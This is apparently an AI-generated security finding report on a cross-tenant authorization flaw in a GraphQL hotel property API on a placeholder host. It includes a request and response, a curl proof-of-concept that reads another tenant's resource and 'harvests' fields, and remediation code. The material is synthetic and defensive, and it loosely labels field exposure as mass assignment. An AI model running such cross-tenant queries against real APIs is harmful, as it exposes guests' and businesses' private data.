# Security Analysis Report
**System:** StayPro Property API (Hospitality / Hotel PMS)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0230 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.12 | Mass assignment via object fields — cross-tenant hotel property data accessed and fields harvested |

---

## Finding 1 — Cross-Tenant Mass Assignment via Object Fields in `getResource` (CRITICAL)

### Summary
The `getResource` resolver on StayPro Property API (`api.staypro-property-api.example.com`) fetches records by `resourceId` only, with no JWT `tenantId` ownership check (§4.0 RISK-GQL-230). The GraphQL query permits the client to request arbitrary fields from the `ResourceData` type. An attacker authenticated as `tenant-a23f` queried resource `R-2230` — belonging to `tenant-5bb4` — and requested sensitive fields including `sensitiveField` and `internalNotes`, which were returned in the response. This is mass assignment via object fields (Pattern 1.12): the client controls which object fields are exposed, and the server returns them without ownership validation.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected resolver:** `getResource(id: ID!): Resource`
**Affected endpoint:** `POST https://api.staypro-property-api.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-a23f`):**
```
POST https://api.staypro-property-api.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-a23f
Content-Type: application/json

{"query": "query VulnerableOp { getResource(id: \"R-2230\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-5bb4",
      "ownerId": "other-user-a23f5bb4",
      "data": {
        "sensitiveField": "CONFIDENTIAL-a23f5bb4",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-a23f5bb4`

The query explicitly requests `sensitiveField` and `internalNotes` — the server returns them without checking whether the authenticated tenant owns the resource. In a hotel PMS, this includes guest PII, reservation data, rate agreements, and property configuration.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-230 | Resolver gap | No `tenantId` ownership check | Root cause |
| §5.0 Pattern 1.12 | Vulnerability | Client-controlled field selection | Mass assignment classification |
| HAR request | `id` | `R-2230` | Cross-tenant resource ID |
| HAR request | `x-tenant-id` | `tenant-a23f` | Attacker tenant |
| HAR response | `tenantId` | `tenant-5bb4` | Victim tenant |
| HAR response | `sensitiveField` | `CONFIDENTIAL-a23f5bb4` | Confidential hotel PMS data |
| HAR response | `ownerId` | `other-user-a23f5bb4` | Victim user |
| HAR headers | `x-request-id` | `req-a23f5bb4` | Correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-a23f):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Query victim resource with expanded field selection (VULNERABLE):**
```bash
curl -s -X POST https://api.staypro-property-api.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-a23f" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { getResource(id: \"R-2230\") { resourceId tenantId ownerId data { sensitiveField internalNotes auditLog { entry } } } }"}' \
  | jq '.data.getResource'
# Expected VULNERABLE output: tenantId=tenant-5bb4, sensitiveField=CONFIDENTIAL-a23f5bb4
```

**Step 3 — Expand field harvesting:**
```bash
# Add auditLog, items fields to harvest historical access data from victim tenant
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns: {"errors":[{"message":"Forbidden: resource does not belong to your tenant"}]}
```

### Remediation

1. **Resolver ownership check:** After fetching the resource, compare `resource.tenantId` against `context.auth.tenantId`; reject with 403 on mismatch.
2. **Field-level authorization:** Restrict `sensitiveField` and `internalNotes` to `role: admin` or resource owner only, regardless of tenancy:
   ```javascript
   if (resource.ownerId !== context.auth.sub && context.auth.role !== 'admin') {
     resource.data.sensitiveField = null;
     resource.data.internalNotes = null;
   }
   ```
3. **Fix Redis cache key:** Include `tenantId` in cache key: `${tenantId}:${resourceId}` (§2.0 gap).
4. **PostgreSQL RLS:** Enforce `tenant_id` row-level policies at DB level.
